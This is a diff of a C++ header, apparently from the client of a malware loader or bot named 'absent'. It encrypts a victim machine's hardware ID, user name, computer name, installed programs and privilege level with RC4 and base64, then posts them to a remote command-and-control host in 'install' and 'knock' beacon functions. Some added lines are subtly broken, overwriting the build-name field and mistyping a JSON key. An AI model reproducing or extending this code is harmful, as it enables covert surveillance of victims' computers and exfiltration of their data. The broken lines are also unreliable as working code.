@@ -1,29 +1,9 @@
 #pragma once
 /*
-	Request - Install (Encrypted + Base64)
-	{
-		"buildName": "",
-		"computerName": "",
-		"cpu": "",
-		"cpuArchitecture": "",
-		"cpuCores": ,
-		"gpu": "",
-		"hardwareID": "",
-		"installPath": "",
-		"installedPrograms": [
-
-		],
-		"operatingSystem": "",
-		"privilege": "",
-		"ram": ,
-		"userName": "",
-		"vram":
-	}
-
 	Request - Knock (Encrypted + Base64)
 	{
 		"hardwareID": "",
-		"installPath": ""
+		"privilege: ""
 	}
 
 	Responce
@@ -43,6 +23,8 @@ namespace absent
 		{
 			absent::crypto::RC4 rc4;
 			info["bn"] = absent::crypto::b64::encode(rc4.crypt(info["bn"], key).c_str());	//Build Name
+			info["bn"] = absent::crypto::b64::encode(rc4.crypt(info["bt"], key).c_str());	//Build Type
+			info["bn"] = absent::crypto::b64::encode(rc4.crypt(info["bu"], key).c_str());	//Build
 			info["hw"] = absent::crypto::b64::encode(rc4.crypt(info["hw"], key).c_str());	//Hardware Id
 			info["un"] = absent::crypto::b64::encode(rc4.crypt(info["un"], key).c_str());	//User Name
 			info["cn"] = absent::crypto::b64::encode(rc4.crypt(info["cn"], key).c_str());	//Computer Name
@@ -58,6 +40,19 @@ namespace absent
 			for (int ip = 0; ip < info["fp"].size(); ip++) {info["fp"][ip] =  absent::crypto::b64::encode(rc4.crypt(info["fp"][ip], key).c_str());} //Found / Installed Programs
 			std::string toSend = absent::crypto::b64::encode(info.dump().c_str());
 
+			return absent::http::post(host, path, toSend);
+		}
+
+		std::string knock(std::string host, std::string path, nlohmann::json info, std::string key)
+		{
+			absent::crypto::RC4 rc4;
+			nlohmann::json smallInfo = 
+			{
+				{"hw", absent::crypto::b64::encode(rc4.crypt(info["hw"], key).c_str())},
+				{"pr", absent::crypto::b64::encode(rc4.crypt(info["pr"], key).c_str())}
+			};
+			std::string toSend = absent::crypto::b64::encode(smallInfo.dump().c_str());
+			
 			return absent::http::post(host, path, toSend);
 		}
 	}
